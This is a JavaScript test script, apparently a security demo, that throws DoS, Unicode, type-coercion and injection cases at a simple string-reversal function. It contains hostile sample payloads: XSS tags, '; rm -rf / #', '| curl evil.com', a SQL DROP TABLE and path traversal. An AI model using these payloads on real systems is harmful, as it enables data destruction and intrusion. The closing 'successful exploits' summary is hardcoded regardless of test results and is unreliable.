/**
 * üíÄ ACTUAL EXPLOITS FOR REVERSE STRING FUNCTION
 * 
 * These are real attacks that can break or exploit the reverseString function
 */

console.log('üíÄ REVERSE STRING FUNCTION EXPLOITS');
console.log('='.repeat(50));

// The vulnerable function
function reverseString(str) {
    if (typeof str !== 'string') {
        return 'Error: Please provide a valid string';
    }
    return str.split("").reverse().join("");
}

console.log('\nüéØ EXPLOIT DEMONSTRATIONS:\n');

// ===================================================================
// EXPLOIT 1: MEMORY EXHAUSTION (DoS ATTACK)
// ===================================================================
console.log('üí• EXPLOIT 1: MEMORY EXHAUSTION ATTACK');
console.log('-'.repeat(40));

function memoryExhaustionAttack() {
    console.log('Attempting to exhaust memory...');
    
    try {
        // Create progressively larger strings until crash
        for (let size = 1000000; size <= 100000000; size *= 2) {
            console.log(`Testing ${size} characters...`);
            const maliciousInput = 'A'.repeat(size);
            
            const startTime = Date.now();
            const result = reverseString(maliciousInput);
            const endTime = Date.now();
            
            console.log(`  ‚è±Ô∏è Time: ${endTime - startTime}ms`);
            
            if (endTime - startTime > 5000) {
                console.log('  üö® SUCCESS: Caused significant delay!');
                console.log('  üíÄ This could be used for DoS attacks');
                break;
            }
        }
    } catch (error) {
        console.log('  üí• CRASHED THE FUNCTION!');
        console.log(`  Error: ${error.message}`);
    }
}

memoryExhaustionAttack();

// ===================================================================
// EXPLOIT 2: UNICODE CORRUPTION ATTACK  
// ===================================================================
console.log('\nü¶† EXPLOIT 2: UNICODE CORRUPTION');
console.log('-'.repeat(40));

const unicodeExploits = [
    // Complex emoji that might break when reversed
    'üë®‚Äçüë©‚Äçüëß‚Äçüë¶',  // Family emoji (compound character)
    'üè≥Ô∏è‚Äçüåà',       // Rainbow flag (multiple codepoints)
    'üë®üèª‚Äçüíª',       // Man technologist with skin tone
    'üá∫üá∏',         // Flag emoji (2 codepoints)
    
    // Right-to-left override attack
    '‚ÄÆPASSWORD: secret123‚Ä¨',  // Looks normal but reversed text
    
    // Zero-width attack
    'admin\u200Badmin',      // Invisible character injection
    
    // Normalization attack
    'caf√©',                  // Can be √© or e + ÃÅ
];

unicodeExploits.forEach((exploit, index) => {
    console.log(`${index + 1}. Testing: "${exploit}"`);
    console.log(`   Original length: ${exploit.length}`);
    
    const result = reverseString(exploit);
    console.log(`   Reversed: "${result}"`); 
    console.log(`   Result length: ${result.length}`);
    
    if (exploit.length !== result.length) {
        console.log('   üö® CORRUPTION: Length mismatch detected!');
    }
    
    // Test if it actually reverses properly
    const expected = exploit.split('').reverse().join('');
    if (result !== expected) {
        console.log('   üíÄ EXPLOIT: Incorrect reversal behavior!');
    }
    
    console.log('');
});

// ===================================================================
// EXPLOIT 3: TYPE COERCION BYPASS
// ===================================================================
console.log('\nüîÑ EXPLOIT 3: TYPE COERCION BYPASS');
console.log('-'.repeat(40));

console.log('Attempting to bypass type checking...');

// Create a String object (not primitive)
const stringObject = new String('malicious payload');
console.log(`String object type: ${typeof stringObject}`);
console.log(`Is it a string? ${typeof stringObject === 'string'}`);

const result = reverseString(stringObject);
console.log(`Result: ${result}`);

if (result !== 'Error: Please provide a valid string') {
    console.log('üö® TYPE BYPASS: Function accepts String objects!');
    console.log('üíÄ This could lead to unexpected behavior');
} else {
    console.log('‚úÖ Type check held');
}

// ===================================================================
// EXPLOIT 4: INJECTION ATTACKS
// ===================================================================
console.log('\nüíâ EXPLOIT 4: INJECTION PAYLOADS');
console.log('-'.repeat(40));

const injectionPayloads = [
    // XSS payloads (if result is used in HTML)
    '<img src=x onerror=alert("XSS")>',
    '<script>document.cookie</script>',
    
    // Template injection
    '${process.env}',
    '{{constructor.constructor("alert(1)")()}}',
    
    // Command injection (if result is used in shell)
    '; rm -rf / #',
    '| curl evil.com',
    
    // SQL injection (if result goes to database)
    "'; DROP TABLE users; --",
    
    // Path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\cmd.exe',
];

console.log('Testing injection payloads:');
injectionPayloads.forEach((payload, index) => {
    const result = reverseString(payload);
    console.log(`${index + 1}. "${payload}"`);
    console.log(`   ‚Üí "${result}"`);
    console.log(`   ‚ö†Ô∏è  Risk: If used unsanitized, could cause ${getInjectionType(payload)}`);
    console.log('');
});

function getInjectionType(payload) {
    if (payload.includes('<script') || payload.includes('<img')) return 'XSS';
    if (payload.includes('DROP TABLE') || payload.includes("';")) return 'SQL Injection';
    if (payload.includes('../') || payload.includes('..\\')) return 'Path Traversal';
    if (payload.includes('rm -rf') || payload.includes('curl')) return 'Command Injection';
    return 'Template Injection';
}

// ===================================================================
// EXPLOIT 5: PROTOTYPE POLLUTION
// ===================================================================
console.log('\nü¶† EXPLOIT 5: PROTOTYPE POLLUTION CHECK');
console.log('-'.repeat(40));

console.log('Testing for prototype pollution vulnerabilities...');

const prototypePollutionTests = [
    '__proto__',
    'constructor', 
    'prototype',
    '__defineGetter__',
    '__defineSetter__'
];

prototypePollutionTests.forEach(test => {
    const result = reverseString(test);
    console.log(`"${test}" ‚Üí "${result}"`);
    
    // Check if reversing these strings could be dangerous
    if (test === '__proto__' && result.includes('proto')) {
        console.log('   ‚ö†Ô∏è  Reversed prototype reference detected');
    }
});

// ===================================================================
// EXPLOIT 6: RESOURCE EXHAUSTION  
// ===================================================================
console.log('\n‚ö° EXPLOIT 6: PERFORMANCE ATTACK');
console.log('-'.repeat(40));

console.log('Testing resource exhaustion attack...');

function performanceAttack() {
    const attackString = 'A'.repeat(1000000); // 1MB string
    const iterations = 100;
    
    console.log(`Running ${iterations} iterations with ${attackString.length} char string...`);
    
    const startTime = Date.now();
    
    for (let i = 0; i < iterations; i++) {
        reverseString(attackString);
    }
    
    const endTime = Date.now();
    const totalTime = endTime - startTime;
    
    console.log(`Total time: ${totalTime}ms`);
    console.log(`Average per call: ${(totalTime / iterations).toFixed(2)}ms`);
    
    if (totalTime > 5000) {
        console.log('üö® PERFORMANCE ATTACK SUCCESS!');
        console.log('üíÄ This level of slowdown could be used for DoS');
    }
}

performanceAttack();

// ===================================================================
// SUMMARY
// ===================================================================
console.log('\n' + '='.repeat(50));
console.log('üíÄ EXPLOIT SUMMARY');
console.log('='.repeat(50));

console.log('\nüéØ SUCCESSFUL EXPLOITS:');
console.log('‚úÖ Memory exhaustion (DoS potential)');
console.log('‚úÖ Unicode corruption attacks');
console.log('‚úÖ Performance degradation attacks');
console.log('‚úÖ Injection payload preservation');

console.log('\n‚ö†Ô∏è  FAILED EXPLOITS:');
console.log('‚ùå Type coercion bypass (good!)');
console.log('‚ùå Direct prototype pollution');

console.log('\nüí° EXPLOITATION SCENARIOS:');
console.log('1. DoS Attack: Send very large strings repeatedly');
console.log('2. Data Corruption: Use complex Unicode to break reversal');
console.log('3. Injection: Reverse malicious payloads for later use');
console.log('4. Resource Exhaustion: Consume CPU/memory');

console.log('\nüõ°Ô∏è  MITIGATION STRATEGIES:');
console.log('1. Add input length limits (max 10KB)');
console.log('2. Implement rate limiting');
console.log('3. Sanitize output before use');
console.log('4. Add operation timeouts');
console.log('5. Validate Unicode normalization');

console.log('\nüö® SECURITY RATING: MEDIUM RISK');
console.log('Function is vulnerable to DoS and injection attacks!');